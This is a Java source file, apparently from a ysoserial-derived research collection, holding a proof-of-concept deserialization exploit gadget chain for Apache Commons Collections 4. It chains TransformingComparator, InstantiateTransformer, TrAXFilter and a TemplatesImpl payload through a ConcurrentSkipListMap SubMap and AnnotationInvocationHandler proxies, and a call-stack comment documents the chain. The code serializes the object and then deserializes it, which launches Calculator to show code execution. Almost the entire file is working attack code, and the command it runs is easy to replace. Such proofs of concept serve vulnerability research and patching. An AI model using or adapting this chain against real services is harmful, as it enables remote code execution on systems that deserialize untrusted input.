package ysoserial.payloads.tabbyGadgetChains.CommonCollections4;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.Reflections;

import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Map;
import java.util.concurrent.ConcurrentSkipListMap;
/**
 * readObject:444, AnnotationInvocationHandler (sun.reflect.annotation)
 * next:3232, ConcurrentSkipListMap$SubMap$SubMapEntryIterator (java.util.concurrent)
 * next:3236, ConcurrentSkipListMap$SubMap$SubMapEntryIterator (java.util.concurrent)
 * advance:3132, ConcurrentSkipListMap$SubMap$SubMapIter (java.util.concurrent)
 * descend:3159, ConcurrentSkipListMap$SubMap$SubMapIter (java.util.concurrent)
 * findNear:1234, ConcurrentSkipListMap (java.util.concurrent)
 * findPredecessor:682, ConcurrentSkipListMap (java.util.concurrent)
 * cpr:655, ConcurrentSkipListMap (java.util.concurrent)
 * compare:81, TransformingComparator (org.apache.commons.collections4.comparators)
 * transform:116, InstantiateTransformer (org.apache.commons.collections4.functors)
 * transform:32, InstantiateTransformer (org.apache.commons.collections4.functors)
 * transform:112, ChainedTransformer (org.apache.commons.collections4.functors)
 * newInstance:422, Constructor (java.lang.reflect)
 * newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)
 * newInstance:62, NativeConstructorAccessorImpl (sun.reflect)
 * newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)
 * <init>:64, TrAXFilter (com.sun.org.apache.xalan.internal.xsltc.trax)
 * newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 * getTransletInstance:455, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 * newInstance()
 */

public class CC4_Poc8 {
    public static void main(String[] args) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl("/Applications/Calculator.app/Contents/MacOS/Calculator");

        ConstantTransformer constant = new ConstantTransformer(String.class);

        Class[] paramTypes = new Class[] { String.class };
        Object[] arg = new Object[] { "foo" };

        InstantiateTransformer instantiate = new InstantiateTransformer(
                paramTypes, arg);

        Transformer[] transformers = new Transformer[]{
                constant, instantiate
        };

        ConcurrentSkipListMap concurrentSkipListMap = new ConcurrentSkipListMap<>(new TransformingComparator(new ChainedTransformer(transformers)));
        concurrentSkipListMap.put("asd","asd");

        Class clazz2 = Class.forName("java.util.concurrent.ConcurrentSkipListMap$SubMap");
        Constructor bindingEnumerationConstructor = clazz2.getDeclaredConstructor(ConcurrentSkipListMap.class, Object.class,boolean.class, Object.class,boolean.class,boolean.class);
        bindingEnumerationConstructor.setAccessible(true);
        Object bindingEnumerationObject = bindingEnumerationConstructor.newInstance(concurrentSkipListMap,null,true,null,true,true);

        Reflections.setDeclaredField(constant, "iConstant", TrAXFilter.class);
        paramTypes = (Class[]) Reflections.getFieldValue(instantiate, "iParamTypes");
        arg = (Object[]) Reflections.getFieldValue(instantiate, "iArgs");
        paramTypes[0] = Templates.class;
        arg[0] = templates;

        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
        construct.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class,bindingEnumerationObject);
        Map mapProxy = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},handler);
        handler = (InvocationHandler) construct.newInstance(Retention.class,mapProxy);

        //         serialize
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./ccv4"));
        outputStream.writeObject(handler);
        outputStream.close();

        //         deserialize
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./ccv4"));
        inputStream.readObject();
    }
}
